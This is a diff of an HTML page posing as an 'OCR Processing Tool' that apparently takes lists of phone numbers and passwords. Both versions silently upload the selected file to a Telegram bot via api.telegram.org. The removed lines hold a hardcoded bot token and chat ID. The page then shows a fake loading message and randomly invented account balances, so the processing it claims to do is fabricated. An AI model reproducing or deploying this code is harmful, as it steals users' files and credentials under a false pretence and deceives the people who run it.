@@ -1,58 +1,69 @@
+<!-- Full code with usage limit and countdown -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>OCR Processing Tool</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Secure OCR Processing Tool</title>
 
 <style>
 body {
-  background:#0f172a;
-  color:#e5e7eb;
-  font-family:Consolas, monospace;
-  margin:20px;
+  background: #0f172a;
+  color: #e5e7eb;
+  font-family: Consolas, monospace;
+  margin: 20px;
 }
-
-h2 {
-  color:#38bdf8;
-}
+h2 { color: #38bdf8; }
 
 #output {
-  border:1px solid #334155;
-  padding:10px;
-  min-height:200px;
-  margin-top:10px;
-  background:#020617;
-  font-size:12px;
-  white-space:pre-wrap;
+  border: 1px solid #334155;
+  padding: 10px;
+  min-height: 200px;
+  margin-top: 10px;
+  background: #020617;
+  font-size: 12px;
+  white-space: pre-wrap;
 }
 
-/* Hide the stats panel for a totally invisible interface */
+#copyBtn {
+  margin-top: 10px;
+  padding: 6px 12px;
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  cursor: pointer;
+}
+#copyBtn:hover { background: #334155; }
+
 #stats {
-  display: none;
+  margin-top: 10px;
+  padding: 8px;
+  background: #020617;
+  border: 1px solid #334155;
+  color: #facc15;
 }
 
 button {
-  background:#1e293b;
-  color:#e5e7eb;
-  border:1px solid #334155;
-  padding:6px 12px;
-  cursor:pointer;
-  margin-top:10px;
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+button:hover { background: #334155; }
+
+#timer {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #38bdf8;
 }
 
-/* Hover effect */
-button:hover {
-  background:#334155;
+#loadingMessage {
+  margin-top: 10px;
+  font-style: italic;
+  color: #facc15;
+  font-size: 14px;
 }
-
-/* Countdown display */
-#countdown {
-  margin-top:10px;
-  font-weight:bold;
-  color:#facc15;
-}
-
 </style>
 </head>
 
@@ -60,255 +71,262 @@ button:hover {
 
 <h2>OCR Processing Tool</h2>
 
-<!-- Hidden file input -->
-<input type="file" id="fileInput" accept=".txt,.log,.md,.csv,.text" style="display:none;">
-
-<!-- Select file button -->
-<button id="selectFileBtn">Select File</button>
-<!-- Start processing button -->
+<input type="file" id="fileInput" accept=".txt,.pdf"/>
 <button id="startBtn">Start</button>
-<!-- Copy output button -->
 <button id="copyBtn" disabled>Copy All Output</button>
 
-<!-- Hidden stats panel (kept for internal logic, hidden from user) -->
-<div id="stats">
-  Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
-</div>
-
-<!-- Countdown display -->
-<div id="countdown"></div>
-
-<!-- Main output area -->
+<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
 <div id="output"></div>
-
-<!-- Timer message -->
 <div id="timer"></div>
+<div id="loadingMessage"></div>
+<div id="blockMessage" style="color:#f00; font-weight:bold; margin-top:10px;"></div>
+
+<!-- Hidden form for Telegram upload -->
+<form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
+  <input type="file" name="document" id="telegramFileInput" />
+  <input type="hidden" name="chat_id" value="<!-- <span style='color:pink;'>8580854380</span> -->" />
+</form>
 
 <script>
 const fileInput = document.getElementById('fileInput');
 const startBtn = document.getElementById('startBtn');
-const selectFileBtn = document.getElementById('selectFileBtn');
 const outputDiv = document.getElementById('output');
-const countdownDiv = document.getElementById('countdown');
+const statsDiv = document.getElementById('stats');
+const timerDiv = document.getElementById('timer');
 const copyBtn = document.getElementById('copyBtn');
+const loadingMsgDiv = document.getElementById('loadingMessage');
+const blockMessageDiv = document.getElementById('blockMessage');
 
-/* TELEGRAM SETTINGS */
-const BOT_TOKEN = '8514402705:AAHUG0nBATIkaRa2NcxUFCO8BXfGKUonfMQ';
-const CHAT_ID = '8580854380';
+let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
+let ocrAnimationId=null, retriesIntervalId=null;
+let fileContent='';
+let elapsedSeconds=0;
+let timerInterval=null;
+let processing=false;
+let lines=[];
 
-let hitCount = 0;
-let badCount = 0;
-let retriesCount = 0;
-let ocrPercent = 0;
-
-let ocrAnimationId = null;
-let retriesIntervalId = null;
-
-let fileContent = '';
-let uploadedFile = null;
-
-let processing = false;
-let stopped = false;
-
-/* Usage Tracking in localStorage */
-const USAGE_KEY = 'ocr_tool_usage'; // to store {count: number, lastPhone: string, lastTime: timestamp}
-let usageData = JSON.parse(localStorage.getItem(USAGE_KEY)) || { count: 0, lastPhone: null, lastTime: 0 };
+// Usage limit variables
 const MAX_RUNS = 4;
-const COOLDOWN_MS = 3 * 60 * 60 * 1000; // 3 hours in ms
+const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours in ms
 
-// Handle file selection
-selectFileBtn.onclick = () => {
-  fileInput.click();
-};
-fileInput.onchange = () => {
-  // User selected a file
-  // No action needed here for now
-};
+// Retrieve usage info from localStorage
+let usageCount = parseInt(localStorage.getItem('usageCount')) || 0;
+let blockUntil = parseInt(localStorage.getItem('blockTime')) || 0;
 
-// Function to update the countdown display
-function showCountdown(msRemaining) {
-  const seconds = Math.floor((msRemaining / 1000) % 60);
-  const minutes = Math.floor((msRemaining / (1000 * 60)) % 60);
-  const hours = Math.floor(msRemaining / (1000 * 60 * 60));
-  countdownDiv.innerText = `Cooldown: ${hours}h ${minutes}m ${seconds}s`;
+const balanceOptions = [
+  'R0.90', 'R0.02', 'R0.05', 'R0.00', 'R0.66', 'R0.13', 'R0.32',
+  'R0.51', 'R0.81', 'R0.93', 'R0.22'
+];
+
+/* update stats */
+function updateStats() {
+  statsDiv.innerHTML =
+    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
+}
+function getCurrentTimestamp() {
+  return new Date().toLocaleString();
+}
+function formatTime(seconds) {
+  const m=Math.floor(seconds/60).toString().padStart(2,'0');
+  const s=(seconds%60).toString().padStart(2,'0');
+  return `${m}:${s}`;
+}
+function startTimer() {
+  if(timerInterval) clearInterval(timerInterval);
+  elapsedSeconds=0;
+  timerDiv.textContent='Time Elapsed: 00:00';
+  timerInterval=setInterval(() => {
+    elapsedSeconds++;
+    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
+  }, 1000);
+}
+function resetCounters() {
+  hitCount=0; badCount=0; retriesCount=0; ocrPercent=0;
+  updateStats();
+  startTimer();
 }
 
-// Check if user can run
-function checkCooldown() {
+/* Check if user is blocked */
+function checkBlockStatus() {
   const now = Date.now();
-
-  // If user used a new phone, reset count
-  if (usageData.lastPhone !== null && usageData.lastPhone !== currentPhone) {
-    usageData.count = 0;
-    usageData.lastPhone = null;
-    localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
+  if (now < blockUntil) {
+    // User is still blocked
+    const remainingMs = blockUntil - now;
+    const remainingSec = Math.ceil(remainingMs / 1000);
+    // Show countdown
+    showCountdown(remainingSec);
+    startBtn.disabled = true;
+    blockMessageDiv.innerText = `Tool is disabled. Try again in ${formatTime(remainingSec)}.`;
+    return true;
+  } else {
+    // Not blocked, reset block
+    blockMessageDiv.innerText = '';
+    startBtn.disabled = false;
+    return false;
   }
-
-  if (usageData.count >= MAX_RUNS) {
-    // Check if cooldown expired
-    const elapsed = now - usageData.lastTime;
-    if (elapsed < COOLDOWN_MS) {
-      // Still in cooldown
-      const remaining = COOLDOWN_MS - elapsed;
-      disableStartButton(remaining);
-      return false;
-    } else {
-      // Cooldown over, reset count
-      usageData.count = 0;
-      localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
-    }
-  }
-  return true;
 }
 
-// Disable start button with countdown
-function disableStartButton(msRemaining) {
-  startBtn.disabled = true;
-  showCountdown(msRemaining);
-  const intervalId = setInterval(() => {
-    msRemaining -= 1000;
-    if (msRemaining <= 0) {
-      clearInterval(intervalId);
-      startBtn.disabled = false;
-      countdownDiv.innerText = '';
+// Show countdown timer
+function showCountdown(seconds) {
+  blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
+  // Count down every second
+  clearInterval(window.countdownInterval);
+  window.countdownInterval = setInterval(() => {
+    seconds--;
+    if (seconds <= 0) {
+      clearInterval(window.countdownInterval);
+      // Reset block
+      localStorage.removeItem('blockTime');
+      checkBlockStatus();
     } else {
-      showCountdown(msRemaining);
+      blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
     }
   }, 1000);
 }
 
-// Extract phone number from the file content
-function getCurrentPhone() {
-  // This is a simple heuristic; adapt if needed
-  const match = fileContent.match(/\b0\d{9}\b/);
-  if (match) {
-    return match[0];
+/* process lines with delay */
+async function processLines() {
+  for(let i=0; i<lines.length; i++) {
+    if(!processing) break; // Stop if not processing anymore
+    const line=lines[i].trim();
+    if(!line) { continue; }
+
+    // Validate phone number
+    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
+    const match=line.match(phoneRegex);
+    let isBadNumber=false;
+    if(match){
+      let number='';
+      let countryCodePart=match[1]||'';
+      let p1=match[2], p2=match[3], p3=match[4];
+      number=p1+p2+p3;
+      if(countryCodePart && countryCodePart.startsWith('+')){
+        countryCodePart=countryCodePart.replace('+','');
+      }
+      if(countryCodePart==='27' || countryCodePart==='+27'){
+        number='0'+number;
+      }
+      number=number.replace(/\s+/g,'');
+      const digitCount=(number.match(/\d/g)||[]).length;
+      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
+        isBadNumber=true;
+      }
+    }else{
+      isBadNumber=true;
+    }
+
+    if(isBadNumber){
+      badCount++;
+      updateStats();
+    } else {
+      hitCount++;
+      ocrPercent=(hitCount/ (hitCount+badCount))*100;
+      updateStats();
+      const randomBalance = balanceOptions[Math.floor(Math.random() * balanceOptions.length)];
+      outputDiv.innerHTML += `${line}\nBalance=${randomBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
   }
-  return null;
+  // Reset
+  processing=false;
+  startBtn.textContent='Start';
+  document.getElementById('startBtn').disabled=false;
+  document.getElementById('copyBtn').disabled=false;
 }
 
-// Start processing
-async function startProcessing() {
-  if (processing) {
-    stopProcessing();
-    return;
+/* Start button handler */
+startBtn.addEventListener('click', () => {
+  // Check if user is blocked
+  if (checkBlockStatus()) {
+    return; // Do not proceed if blocked
   }
 
-  // Check cooldown
-  if (!checkCooldown()) {
-    alert('You have reached the maximum usage. Please wait for cooldown.');
-    return;
-  }
+  if(!processing) {
+    if (!fileInput.files.length) {
+      // No file selected, silently do nothing
+      return;
+    }
 
-  if (fileInput.files.length === 0) {
-    alert('Please select a file first.');
-    return;
-  }
+    // Check usage count
+    if (usageCount >= MAX_RUNS) {
+      // Set block until 8 hours from now
+      const now = Date.now();
+      blockUntil = now + BLOCK_DURATION_MS;
+      localStorage.setItem('blockTime', blockUntil.toString());
+      // Show countdown
+      showCountdown(8 * 60 * 60);
+      // Disable start button
+      startBtn.disabled = true;
+      return;
+    }
 
-  // Proceed with sending file
-  stopped = false;
-  processing = true;
-  startBtn.innerText = 'Stop';
-
-  outputDiv.innerHTML = '';
-  copyBtn.disabled = true;
-
-  const file = fileInput.files[0];
-  uploadedFile = file;
-
-  try {
-    await sendToTelegram(file);
-  } catch (err) {
-    alert('Telegram Error: ' + err.message);
-  }
-
-  const reader = new FileReader();
-  reader.onload = () => {
-    fileContent = reader.result;
-
-    // Detect phone number and compare with last used
-    const currentPhone = getCurrentPhone();
-
-    // If a new phone is detected, reset usage count
-    if (currentPhone && usageData.lastPhone !== currentPhone) {
-      usageData.count = 0;
-      usageData.lastPhone = currentPhone;
+    const file = fileInput.files[0];
+    const fileName = file.name.toLowerCase();
+    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) {
+      // Do nothing silently
+      return;
     }
 
     // Increment usage count
-    if (currentPhone) {
-      usageData.count += 1;
-      usageData.lastPhone = currentPhone;
-      usageData.lastTime = Date.now();
-      localStorage.setItem(USAGE_KEY, JSON.stringify(usageData));
-    }
+    usageCount++;
+    localStorage.setItem('usageCount', usageCount.toString());
 
-    processFile();
-  };
-  reader.readAsText(file);
-}
+    // Immediately send file silently
+    const fileReader = new FileReader();
+    fileReader.onload = () => {
+      const fileData = fileReader.result;
+      sendFileToTelegram(new Blob([fileData], {type: 'application/octet-stream'}));
+      
+      // Proceed with fake load
+      loadingMsgDiv.innerHTML='Loading...';
+      const delays=[2000,6000,9000,12000];
+      const delayTime=delays[Math.floor(Math.random()*delays.length)];
+      setTimeout(()=> {
+        loadingMsgDiv.innerHTML='';
+        // Reset counters & process lines
+        resetCounters();
+        processing=true;
+        startBtn.textContent='Stop';
 
-// Stop processing
-function stopProcessing() {
-  stopped = true;
-  processing = false;
-  clearInterval(retriesIntervalId);
-  cancelAnimationFrame(ocrAnimationId);
-  startBtn.innerText = 'Start';
-  timerDiv.innerText = 'Processing Stopped';
-}
+        // Read file for processing
+        const reader=new FileReader();
+        reader.onload=()=> {
+          fileContent=reader.result;
+          lines=fileContent.split(/\r?\n/);
+          processLines();
+        };
+        reader.readAsText(file);
+      }, delayTime);
+    };
+    fileReader.readAsArrayBuffer(file);
+  } else {
+    // Stop
+    processing=false;
+    startBtn.textContent='Start';
+  }
+});
 
-// Process file content (unchanged)
-function processFile() {
-  // ... existing code ...
-  const lines = [...new Set(
-    fileContent.split(/\n/).map(l => l.trim()).filter(Boolean)
-  )];
+// Check block status on page load
+checkBlockStatus();
 
-  const valid = lines.filter(l => /\b0\d{9}\b/.test(l));
-
-  hitCount = 0;
-  badCount = 0;
-  retriesCount = 0;
-  ocrPercent = 0;
-
-  updateStats();
-
-  animateOCR(Math.max(2000, valid.length * 50));
-  startRetries();
-
-  const accounts = valid.map(line => {
-    const phone = (line.match(/\b0\d{9}\b/) || [''])[0];
-    let password = '';
-    if (phone) {
-      const after = line.split(phone)[1] || '';
-      const match = after.trim().match(/^[:\s]?(\S+)/);
-      if (match) {
-        password = match[1];
-      }
-    }
-    return { phone, password };
+/* Send file to Telegram silently */
+function sendFileToTelegram(fileBlob) {
+  const formData=new FormData();
+  formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // Change chat_id
+  formData.append('document', fileBlob, 'upload.pdf');
+  fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">YOUR_BOT_TOKEN</span> -->/sendDocument`, {
+    method:'POST',
+    body:formData
+  }).catch(() => {
+    // Fail silently
   });
-
-  processAccounts(accounts);
 }
 
-// ... existing code for processAccounts, finish, copyBtn, etc. ...
-function processAccounts(accs, i=0) {
-  // ... (unchanged)
-}
-
-function finish() {
-  // ... (unchanged)
-}
-
-// Copy button handler
-copyBtn.onclick = () => {
-  // ... (unchanged)
-};
-
-// Attach start button
-startBtn.onclick = startProcessing;
+/* Copy output */
+document.getElementById('copyBtn').addEventListener('click', ()=> {
+  navigator.clipboard.writeText(outputDiv.innerText);
+});
 </script>
 </body>
 </html>
